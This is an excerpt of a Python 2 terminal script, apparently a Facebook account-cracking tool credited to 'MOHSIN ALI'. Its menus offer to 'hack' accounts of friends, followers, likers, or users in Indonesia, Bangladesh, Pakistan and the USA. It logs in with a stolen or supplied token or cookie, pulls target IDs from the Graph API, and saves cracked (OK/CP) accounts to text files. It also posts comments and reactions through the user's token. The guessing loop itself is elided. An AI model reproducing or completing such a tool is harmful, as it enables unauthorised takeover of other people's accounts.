...
def animate():
    for c in itertools.cycle(['\033[0;97m|', '\033[0;97m/', '\033[0;97m-', '\033[0;97m\\']):
        if done:
            break
        sys.stdout.write('\r\033[0;91m' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
...
\033[0;91m╚═══════════════════════════════════════════════════════════════╝
\033[0;91m╔═══════════════════════════════════════════════════════════════╗
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;97mCODER   \033[0;91m: \033[0;98mMOHSIN ALI
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;97mGithub   \033[0;91m: \033[0;97mMOHSIN THE LEGEND
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;97mFacebook \033[0;91m: \033[0;97mhttps://www.facebook.com/MOHSIN.ALI.THE.FATHER.OF.HATERX
\033[1;91m : {\033[0;97m•\033[0;91m \033[1;93mWHATSAPP
\033[1;91m : {\033[0;97m•\033[0;91m 03063112***
\033[0;91m╚═══════════════════════════════════════════════════════════════╝
""")
...
def masuk():
	...
	print logo
	print ('\033[0;91m╔═══════════════════════════════════════════════════════════════╗')
	print ('\033[0;97m   1.\033[0;97m Login With Token Facebook')
...
def pilih_masuk():
	...
	if msuk =="":
		print '\033[0;97m   ! Correct Content'
		pilih_masuk()
	elif msuk =="1":
		login_token()
	elif msuk =="2":
...
def login_token():
	...
	try:
		...
		zedd.write(toket)
		zedd.close()
		print '\033[0;93m   √ Login Successful'
		bot_komen()
	except KeyError:
		print '\033[1;91m   ! Token Invild '
		time.sleep(1.7)
		masuk()
...
def login_cookie():
	...
	try:
		...
		zedd.write(hasil)
		zedd.close()
		print '\033[0;97m   √ Login Successful'
		time.sleep(2)
		bot_komen()
	except AttributeError:
		print '\033[0;97m   ! Cookie Wrong'
		time.sleep(2)
		masuk()
		...
		os.system('clear')
		print '\033[0;97m   ! Connection problem'
		exit()
...
def bot_komen():
	...
	kom = ('Success Always Bang! 😘')
	reac = ('LOVE')
	post = ('10215192646369292')
	post2 = ('10215301558092017')
	kom2 = ('Success Always Bang! 😘')
	reac2 = ('LOVE')
...
def menu():
	...
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Hack ID From Friend/Public')
	print ('\033[0;97m   2.\033[0;97m Hack ID From Like Friend/Public')
	print ('\033[0;97m   3.\033[0;97m Hack ID From Followers')
	print ('\033[0;97m   4.\033[0;97m Change ID Username')
	print ('\033[0;97m   5.\033[0;97m See Result Hack')
	print ('\033[0;97m   6.\033[0;97m Update Script')
	print ('\033[0;97m   0.\033[0;97m EXIT')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_menu()
...
def pilih_menu():
	...
	if peler =="":
		print '\033[0;97m   ! Fill In Correct'
		pilih_menu()
	elif peler == "1":
		crack_teman()
	elif peler == "2":
...
def crack_teman():
	...
	print (logo)
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;91m   1.\033[0;97m HACK ID Indonesia')
	print ('\033[0;97m   2.\033[0;91m HACK ID Bangladesh')
	print ('\033[0;97m   3.\033[0;92m HACK ID Pakistan')
	print ('\033[0;97m   4.\033[0;95m HACK ID Usa')
	print ('\033[0;97m   0.\033[0;97m Back')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_teman()
...
def pilih_teman():
	...
	if uki =="":
		print '\033[0;91m   ! Fill In Correct'
		pilih_teman()
	elif uki == "1":
		crack_indo()
	elif uki == "2":
...
def crack_indo():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Hack From Friend List')
	print ('\033[0;97m   2.\033[0;97m HACK From Public/Friend')
	print ('\033[0;97m   0.\033[0;97m Back')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_indo()
...
def pilih_indo():
	...
	if teak =="":
		...
		print logo
		print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
		idt = raw_input("\033[0;97m   • \033[0;97mID Public/Friend \033[0;97m:\033[0;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;97m   •\033[0;97m Name \033[0;97m:\033[0;97m "+sp["name"]
		except KeyError:
			print "\033[0;97m   ! ID public/Friend Not Found"
			raw_input("\n\033[1;97m   < \033[0;97mBack \033[0;97m>")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! Connection Lost'
			keluar()
	...
	print '\033[0;97m   • \033[0;97mTOTAL IDZ\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
...
### MAIN INDONESIA ###
	...
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print '\033[0;97m   • \033[0;97mSuccessFul ...'
	...
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile saved \033[0;97m: \033[0;97mdone/indo.txt'
	print "\033[0;91m╚═══════════════════════════════════════════════════════════════╝"
...
def crack_bangla():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack From Friend List')
	print ('\033[0;97m   2.\033[0;97m Crack From Public/Friend')
	print ('\033[0;97m   0.\033[0;97m Back')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_bangla()
...
def pilih_bangla():
	...
	print '\033[0;97m   • \033[0;97mTotal ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
...
### MAIN BANGLADESH ###
	...
	print '\033[0;97m   • \033[0;97mSuccessful ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile Saved \033[0;97m: \033[0;97mdone/bangla.txt'
	print "\033[0;91m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 MOHSIN.py")
...
def crack_pakis():
	...
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack From Friend List')
	print ('\033[0;97m   2.\033[0;97m Crack From Public ID')
	print ('\033[0;97m   0.\033[0;97m Back')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_pakis()
...
### MAIN PAKISTAN ###
	...
	print '\033[0;97m   • \033[0;97mSuccessful ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile saved \033[0;97m: \033[0;97mdone/pakis.txt'
	print "\033[0;91m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mBack\033[0;97m >")
	os.system("python2 MOHSIN.py")
...
def pilih_usa():
	...
	if teak =="":
		...
		try:
			...
			print "\033[0;97m   ! ID public/freind Not Found"
			raw_input("\n\033[1;97m   < \033[0;97mBack \033[0;97m>")
			crack_usa()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! Connection Lost'
...
### MAIN USA ###
	...
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print '\033[0;97m   • \033[0;97mSuccesful ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile saved \033[0;97m: \033[0;97mdone/usa.txt'
	print "\033[0;91m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 MOHSIN.py")
...
def crack_like():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	idt = raw_input("\033[0;97m   • \033[0;97mID Posts Public/Friend \033[0;97m:\033[0;97m ")
	try:
		...
		print "\033[0;97m   ! ID posts Wrong"
		raw_input("\n\033[1;97m   < \033[0;97mBack \033[0;97m>")
		menu()
	except requests.exceptions.SSLError:
	...
	print '\033[0;97m   • \033[0;97m   Total ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
...
### MAIN LIKE ###
	...
	print '\033[0;97m   • \033[0;97mSuccessful ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile Saved \033[0;97m: \033[0;97mdone/like.txt'
	print "\033[0;91m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 MOHSIN.py")
...
def crack_follow():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack From Followers Syco')
	print ('\033[0;97m   2.\033[0;97m Crack From Follower Friend')
	print ('\033[0;97m   0.\033[0;97m Back')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_follow()
...
def pilih_follow():
	...
	if keak =="":
		...
		try:
			...
			print "\033[0;97m   ! ID public/Not Found"
			raw_input("\n\033[1;97m   < \033[0;97mBack \033[0;97m>")
			crack_follow()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! lost connection'
			keluar()
...
### MAIN FOLLOW ###
	...
	print '\033[0;97m   • \033[0;97mSUCCESSFUL ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile SAVED \033[0;97m: \033[0;97mdone/follow.txt'
	print "\033[0;91m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mBack\033[0;97m >")
	os.system("python2 MOHSIN.py")
...
def cari_id():
	...
	for hasil in nex:
		print '\n'+'\033[0;97m   • \033[0;97mID you\033[0;97m :\033[0;97m '+result
                print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
		raw_input("\n\033[0;97m   < \033[0;97mBack \033[0;97m>")
		menu()
...
def hasil_crack():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1. \033[0;97mSee Result Crack Indonesia')
	print ('\033[0;97m   2. \033[0;97mSee Result Crack Bangladesh')
	print ('\033[0;97m   3. \033[0;97mSee Result Crack Pakistan')
	print ('\033[0;97m   4. \033[0;97mSee Result Crack USA')
	print ('\033[0;97m   5. \033[0;97mSee Result Crack Like')
	print ('\033[0;97m   6. \033[0;97mSee Result Crack Follow')
	print ('\033[0;97m   0. \033[0;97mBack')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_hasil()
...
def perbarui():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	jalan ("\033[0;97m   Update Script ...\033[0;97m")
        print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	os.system("git pull origin master")
	raw_input("\n\033[0;97m   <\033[0;97m Back \033[0;97m>")
	os.system("python2 MOHSIN.py")
